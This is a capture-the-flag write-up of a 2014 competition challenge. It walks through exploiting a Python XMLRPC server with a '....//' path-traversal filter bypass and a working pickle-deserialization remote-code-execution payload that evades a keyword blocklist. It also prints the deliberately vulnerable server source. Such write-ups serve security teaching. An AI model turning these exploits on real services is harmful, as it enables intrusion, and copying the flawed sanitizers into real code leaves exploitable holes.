# NoConName 2014 Finals: XMLRPC

**Category:** Exploiting
**Points:** ???
**Description:**

Looks like you're in a pretty pickle now! Can you get the flag?

## Write-up

We get an IP address, scanning with nmap we find port 12345 open. It's an HTTP server that responds to XMLRPC requests.

```
PORT      STATE SERVICE VERSION
12345/tcp open  http    BaseHTTP 0.3 (Python SimpleXMLRPCServer; Python 2.7.3)
|_http-title: Error response
|_http-methods: No Allow or Public header in OPTIONS response (status code 501)
```

Using Python's xmlrpc library we get:

```
$ python
Python 2.7.3 (default, Mar 13 2014, 11:03:55)
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from xmlrpclib import *
>>> s = ServerProxy("http://target:12345", allow_none=True)
>>> s.system.listMethods()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1312, in single_request
    response.msg,
xmlrpclib.ProtocolError: <ProtocolError for target:12345/RPC2: 501 encoding 'identity' not supported>
```

The error message says the server requires some special kind of encoding. Looking at the HTTP headers we see only one encoding is supported (gzip) so we force our client to use it.

```
>>> t = Transport()
>>> t.encode_threshold = 0
>>> s = ServerProxy("http://target:12345", transport=t, allow_none=True)
>>> s.system.listMethods()
['get_api_endpoints', 'system.listMethods', 'system.methodHelp', 'system.methodSignature']
```

There's only one method, get_api_endpoints. Let's call it.

```
>>> s.get_api_endpoints()
['/RPC2', '/random', '/fileserver']
```

Since /RPC2 is the default XMLRPC path, we'll assume the other two are virtual XMLRPC server paths. Let's try them:

```
>>> s = ServerProxy("http://target:12345/fileserver", transport=t, allow_none=True)
>>> s.system.listMethods()
['append', 'delete', 'listdir', 'read', 'system.listMethods', 'system.methodHelp', 'system.methodSignature']
```

This looks like some kind of file server, with methods to list directories, read, write and delete files.

```
>>> s.listdir()
['flag.txt']
```

Looking good!

```
>>> print s.read('flag.txt')
Jack Sparrow: How did you get here?
Will Turner: Sea turtles, mate. A pair of them strapped to my feet.
Jack Sparrow: Not so easy, is it?
```

Meh, it was a trap :D

Let's try to exploit this service...

```
>>> s.read('/etc/passwd')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Hacking attempt detected! Your IP address has been traced, an FBI team will soon arrive to your location. Please stay where you are and wait for your arrest.">
```

While the FBI is coming, we keep looking. ;)

```
>>> s.listdir('/')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Hacking attempt detected! Your IP address has been traced, an FBI team will soon arrive to your location. Please stay where you are and wait for your arrest.">
```

Nope...

```
>>> s.listdir('../')
['flag.txt']
>>> s.listdir('../../../../')
['flag.txt']
```

Uhm, interesting. We got exactly the same result as an empty parameter.

```
>>> s.listdir('../../../../etc/passwd')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Invalid directory: ./fileserver/etc/passwd">
```

Now we know the real path for the file flag.txt, or at least a relative path to wherever the server is installed. We also know the sequences "../" are being filtered out from the input. This is a classic, albeit flawed way of avoiding path traversal vulnerabilities.

```
>>> s.listdir('....//')
['fileserver', 'supervise', 'server.py', 'run']
```

This looks better - by removing "../" from "....//" we get "../" again, so we can list directories above the root. We know "fileserver" is where the files are, and "server.py" is probably the server code. Let's try reading it...

```
>>> s.read('....//server.py')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Hacking attempt detected! Your IP address has been traced, an FBI team will soon arrive to your location. Please stay where you are and wait for your arrest.">
```

Oops, this call doesn't have the bug! Well, we still have a service to explore...

```
>>> s = ServerProxy("http://target:12345/random", transport=t, allow_none=True)
>>> s.system.listMethods()
['getstate', 'random', 'seed', 'setstate', 'system.listMethods', 'system.methodHelp', 'system.methodSignature']
```

Looks like a pseudo random generator.

```
>>> s.random()
0.891038931836746
>>> s.random()
0.45602713966818337
>>> s.random()
0.9581700716673957
>>> s.random()
0.22924179661741917
```

Indeed. Let's try out getstate()...

```
>>> s.getstate()
'KEkxCihJNDkzOApJMjc0NDYKSTQ4NjcKdHAxCk50Lg==\n'
```

That's base64, we decode it:

```
>>> s.getstate().decode('base64')
'(I1\n(I4938\nI27446\nI4867\ntp1\nNt.'
```

This is a bit more mysterious, but with a sharp eye and a little patience we can guess it's Python's serialization format (pickle) as hinted in the description.

```
>>> from cPickle import *
>>> loads(s.getstate().decode('base64'))
(1, (4938, 27446, 4867), None)
```

Now that we know the format, let's try sending it garbage.

```
>>> s.setstate(dumps((1, (4938, 27446, 4867), None)).encode('base64'))
>>> s.setstate(dumps((1, (4938, 27446, 0), None)).encode('base64'))
>>> s.setstate(dumps((1, (4938, 0, 0), None)).encode('base64'))
>>> s.setstate(dumps((1, (0, 0, 0), None)).encode('base64'))
>>> s.setstate(dumps((0, (0, 0, 0), None)).encode('base64'))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Invalid state data">
```

But the interesting thing here is the pickle format is known to be vulnerable to remote code injection, so we can just upload whatever Python code we want to run. With this we can read the server.py file, for example by copying it to the directory we can access.

```
>>> class Exploit(object):
...   def __reduce__(self):
...     import os
...     return (os.system, ('cp ./server.py ./fileserver/server.py',))
...
>>> s.setstate(dumps(Exploit()).encode('base64'))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Hacking attempt detected! Your IP address has been traced, an FBI team will soon arrive to your location. Please stay where you are and wait for your arrest.">
```

Oops, it caught us! But since the security of this service seems based on simple filters, let's try to bypass it. After all, we don't need a shell, we can run any Python code we want.

```
>>> class Exploit(object):
...   def __reduce__(self):
...     import shutil
...     return (shutil.copyfile, ('./server.py', './fileserver/server.py'))
...
>>> s.setstate(dumps(Exploit()).encode('base64'))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/xmlrpclib.py", line 1224, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1578, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.7/xmlrpclib.py", line 1264, in request
    return self.single_request(host, handler, request_body, verbose)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1297, in single_request
    return self.parse_response(response)
  File "/usr/lib/python2.7/xmlrpclib.py", line 1473, in parse_response
    return u.close()
  File "/usr/lib/python2.7/xmlrpclib.py", line 793, in close
    raise Fault(**self._stack[0])
xmlrpclib.Fault: <Fault 1: "<type 'exceptions.ValueError'>:Invalid state data">
```

There! Out exploit is no longer detected. The error message is fine, we're sending it crap, but let's check if the code injection worked.

```
>>> s = ServerProxy("http://target:12345/fileserver", transport=t, allow_none=True)
>>> s.listdir()
['flag.txt', 'server.py']
```

It worked! Now we can read the file with the read() method.

```
#!/usr/bin/env python

from cPickle import loads, dumps
from hashlib import sha1
from os import listdir, unlink
from os.path import abspath, dirname, join
from random import WichmannHill
from SimpleXMLRPCServer import MultiPathXMLRPCServer, SimpleXMLRPCRequestHandler, SimpleXMLRPCDispatcher

class RandomServer(object):

    def __init__(self):
        self.rnd = WichmannHill()

    def seed(self, num):
        """Set the seed for the random number generator."""
        self.rnd.seed(num)

    def random(self):
        """Get a random number."""
        try:
            return self.rnd.random()
        except Exception:
            raise ValueError("Invalid seed value")

    def getstate(self):
        """Get the state of the random number generator."""
        return dumps(self.rnd.getstate()).encode("base64")

    def setstate(self, state):
        """Restore the state of the random number generator."""
        state = state.decode("base64")
        test = state.lower()
        if "system" in test or "/bin/sh" in test or "popen" in test or "proc" in test:
            raise ValueError(
                "Hacking attempt detected! Your IP address has been traced, "
                "an FBI team will soon arrive to your location. Please stay "
                "where you are and wait for your arrest.")
        try:
            self.rnd.setstate(loads(state))
        except Exception:
            raise ValueError("Invalid state data")

class FileServer(object):

    def listdir(self, directory = "."):
        """Get a directory listing. Optionally specify a directory to list."""
        directory = directory.replace("../", "")
        rootdir = join(dirname(__file__), "fileserver")
        directory = join(rootdir, directory)
        if not directory.startswith(rootdir):
            raise ValueError(
                "Hacking attempt detected! Your IP address has been traced, "
                "an FBI team will soon arrive to your location. Please stay "
                "where you are and wait for your arrest.")
        try:
            return listdir(directory)
        except Exception:
            raise ValueError("Invalid directory: %s" % directory)

    def read(self, filename):
        """Get the contents of a file."""
        filename = filename.replace("../", "")
        rootdir = abspath(join(dirname(__file__), "fileserver"))
        filename = abspath(join(rootdir, filename))
        if not filename.startswith(rootdir):
            raise ValueError(
                "Hacking attempt detected! Your IP address has been traced, "
                "an FBI team will soon arrive to your location. Please stay "
                "where you are and wait for your arrest.")
        try:
            with open(filename, "rb") as fd:
                return fd.read()
        except Exception:
            raise ValueError("Invalid filename: %s" % filename)

    def append(self, filename, data):
        """Append data to the end of a file."""
        filename = filename.replace("../", "")
        rootdir = abspath(join(dirname(__file__), "fileserver"))
        filename = abspath(join(rootdir, filename))
        if not filename.startswith(rootdir):
            raise ValueError(
                "Hacking attempt detected! Your IP address has been traced, "
                "an FBI team will soon arrive to your location. Please stay "
                "where you are and wait for your arrest.")
        try:
            with open(filename, "ab") as fd:
                return fd.write(data)
        except Exception:
            raise ValueError("Invalid filename: %s" % filename)

    def delete(self, filename):
        """Delete a file."""
        filename = filename.replace("../", "")
        rootdir = abspath(join(dirname(__file__), "fileserver"))
        filename = abspath(join(rootdir, filename))
        if not filename.startswith(rootdir):
            raise ValueError(
                "Hacking attempt detected! Your IP address has been traced, "
                "an FBI team will soon arrive to your location. Please stay "
                "where you are and wait for your arrest.")
        try:
            unlink(filename)
        except Exception:
            raise ValueError("Invalid filename: %s" % filename)

class SecretServer(object):

    def get_answer_to_life_the_universe_and_everything(self):
        return 42

    def get_number_one_source_for_the_truth(self):
        return "http://www.truthism.com/"

    def get_secrets_of_time_travel(self):
        return "https://www.google.com/search?q=John+Titor"

    def get_world_nuclear_launch_codes(self):
        return "NCN" + sha1("New World Order").hexdigest()

class InfoServer(object):
    def get_api_endpoints(self):
        """Enumerate all public API endpoints."""
        return [
            x for x in RequestHandler.rpc_paths
            if not x.startswith("/secret_")
        ]

class RequestHandler(SimpleXMLRPCRequestHandler):
    encode_threshold = 0
    rpc_paths = (
        "/RPC2",
        "/random",
        "/fileserver",
        "/secret_illuminati_world_domination_plans"
    )

    def decode_request_content(self, data):
        encoding = self.headers.get("content-encoding", "identity").lower()
        if encoding != "gzip":
            self.send_response(501, "encoding %r not supported" % encoding)
        return SimpleXMLRPCRequestHandler.decode_request_content(self, data)

if __name__ == "__main__":

    server = MultiPathXMLRPCServer(("0.0.0.0", 12345),
                requestHandler=RequestHandler,
                allow_none=True, encoding="utf8")

    random_server = SimpleXMLRPCDispatcher(allow_none=True, encoding="utf8")
    random_server.register_introspection_functions()
    random_server.register_instance(RandomServer())
    server.add_dispatcher("/random", random_server)

    file_server = SimpleXMLRPCDispatcher(allow_none=True, encoding="utf8")
    file_server.register_introspection_functions()
    file_server.register_instance(FileServer())
    server.add_dispatcher("/fileserver", file_server)

    secret_server = SimpleXMLRPCDispatcher(allow_none=True, encoding="utf8")
    secret_server.register_introspection_functions()
    secret_server.register_instance(SecretServer())
    server.add_dispatcher("/secret_illuminati_world_domination_plans", secret_server)

    info_server = SimpleXMLRPCDispatcher(allow_none=True, encoding="utf8")
    info_server.register_introspection_functions()
    info_server.register_instance(InfoServer())
    server.add_dispatcher("/RPC2", info_server)

    server.serve_forever()
```

Now we have all we need. Reading the source code we can understand what it does and calculate the flag. But why not make the server itself tell us the flag? There turned out to be a secret API endpoint!

```
>>> s = ServerProxy("http://target:12345/secret_illuminati_world_domination_plans", transport=t, allow_none=True)
>>> s.system.listMethods()
['get_answer_to_life_the_universe_and_everything', 'get_number_one_source_for_the_truth', 'get_secrets_of_time_travel', 'get_world_nuclear_launch_codes', 'system.listMethods', 'system.methodHelp', 'system.methodSignature']
>>> s.get_answer_to_life_the_universe_and_everything()
42
>>> s.get_number_one_source_for_the_truth()
'http://www.truthism.com/'
>>> s.get_secrets_of_time_travel()
'https://www.google.com/search?q=John+Titor'
>>> s.get_world_nuclear_launch_codes()
'NCN298f74dba8de5945adb45b0fb43a4a4f141b8bfa'
```

That last one is the flag. The rest of that nonsense I won't explain, it's much more fun to find out on your own. ;)

The code to generate the flag is:

```
    def get_world_nuclear_launch_codes(self):
        return "NCN" + sha1("New World Order").hexdigest()
```

Finally, we delete the file "server.py" so we don't help the other teams ;)

```
>>> s = ServerProxy("http://target:12345/fileserver", transport=t, allow_none=True)
>>> s.delete('server.py')
>>> s.listdir()
['flag.txt']
```

Another option was to copy the file with another name starting with a dot, to make it hidden. The listdir() method in this service doesn't list hidden files.
